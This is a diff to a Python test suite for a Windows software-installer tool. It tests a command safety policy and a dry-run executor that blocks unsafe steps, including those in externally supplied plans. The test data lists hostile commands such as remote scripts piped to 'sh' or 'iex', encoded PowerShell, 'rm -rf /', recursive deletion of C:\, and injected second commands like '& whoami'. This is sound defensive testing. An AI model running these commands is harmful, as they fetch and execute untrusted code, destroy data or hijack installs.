@@ -61,12 +61,20 @@ def test_security_policy_classifies_sources_and_commands():
     assert source_base_risk(InstallSource(type="unknown", name="Unknown")) == "blocked"
 
     assert review_command("winget install Git.Git").allowed
+    assert review_command("winget install --id Git.Git --source winget").allowed
+    assert review_command("where code").allowed
+    assert not review_command("winget install Git.Git; calc").allowed
+    assert not review_command("where code & whoami").allowed
     dangerous_commands = [
         "Invoke-WebRequest https://example.com/install.ps1 | iex",
         "curl https://example.com/install.ps1 | powershell",
+        "curl https://example.com/install.sh | sh",
+        "wget https://example.com/install.sh | bash",
         "irm https://example.com/install.ps1 | iex",
         "iwr https://example.com/install.ps1 | iex",
+        "powershell -EncodedCommand SQBFAFgA",
         "Set-ExecutionPolicy Bypass",
+        "rm -rf /",
         "reg add HKCU\\Software\\StackPilot",
         "reg delete HKCU\\Software\\StackPilot",
         "Remove-Item -Recurse C:\\",
@@ -240,6 +248,45 @@ def test_dry_run_executor_never_uses_subprocess_and_skips_blocked_steps():
     assert result.steps[1].skipped is True
     assert result.steps[1].skip_reason == "已被安全策略阻止"
     assert json.dumps(model_to_dict(result))
+
+
+def test_dry_run_executor_rechecks_commands_from_external_plans():
+    disguised_step = InstallStep(
+        id="install-1-unsafe",
+        app_id="unsafe",
+        app_name="Unsafe",
+        source=InstallSource(type="winget", name="Unsafe", package_id="Unsafe.Tool"),
+        command="Invoke-WebRequest https://example.com/install.ps1 | iex",
+        rollback_command="winget uninstall Unsafe.Tool",
+        risk_level="low",
+    )
+    unsafe_verify_step = InstallStep(
+        id="install-2-unsafe-verify",
+        app_id="unsafe_verify",
+        app_name="Unsafe Verify",
+        source=InstallSource(type="winget", name="Unsafe Verify", package_id="Unsafe.Verify"),
+        command="winget install Unsafe.Verify",
+        rollback_command="winget uninstall Unsafe.Verify",
+        verify_commands=["reg add HKCU\\Software\\StackPilot"],
+        risk_level="low",
+    )
+    plan = InstallPlan(
+        plan_id="plan-external",
+        goal_id="test",
+        goal_name="Test",
+        steps=[disguised_step, unsafe_verify_step],
+    )
+
+    result = DryRunExecutor().run(plan)
+
+    assert result.steps[0].would_run is False
+    assert result.steps[0].skipped is True
+    assert result.steps[0].risk_level == "blocked"
+    assert result.steps[0].skip_reason == "command blocked by command safety policy"
+    assert result.steps[1].would_run is False
+    assert result.steps[1].skipped is True
+    assert result.steps[1].risk_level == "blocked"
+    assert result.steps[1].skip_reason == "verify_command:0 blocked by command safety policy"
 
 
 def test_plan_and_dry_run_cli_generate_required_files(tmp_path, monkeypatch):
